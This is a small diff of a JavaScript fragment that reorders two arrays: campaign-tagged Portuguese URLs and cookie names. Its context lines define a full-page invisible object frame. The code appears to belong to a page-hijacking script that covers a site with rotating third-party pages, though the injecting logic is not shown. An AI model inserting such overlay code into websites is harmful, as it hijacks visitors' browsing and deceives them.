@@ -1,5 +1,5 @@
-var randLinks = ["https://guiadepescaesportivaemsantos.com/?utm=facebook&campanha=7ac02484ab9cbec10630849f903cb6e5&id=a8f5f167f44f4964e6c998dee827110c", "https://www.mantendoasaude.com/?utm=instagram&campanha=N2FjMDI0ODRhYjljYmVjMTA2MzA4NDlmOTAzY2I2ZTUmaWQ9YThmNWYxNjdmNDRmNDk2NGU2Yzk5OGRlZTgyNzExMGM="];
-var randCookies = ["_gcli1","_gcli2"];
+var randLinks = ["https://www.mantendoasaude.com/?utm=instagram&campanha=N2FjMDI0ODRhYjljYmVjMTA2MzA4NDlmOTAzY2I2ZTUmaWQ9YThmNWYxNjdmNDRmNDk2NGU2Yzk5OGRlZTgyNzExMGM=","https://guiadepescaesportivaemsantos.com/?utm=facebook&campanha=7ac02484ab9cbec10630849f903cb6e5&id=a8f5f167f44f4964e6c998dee827110c"];
+var randCookies = ["_gcli2","_gcli1"];
 var cookieName = '';
 var urlFrame = '';
 var frameCode = '<object id="iplezier" type="text/html" style="position:absolute;width:100%;height:100%;overflow: hidden"></object>';
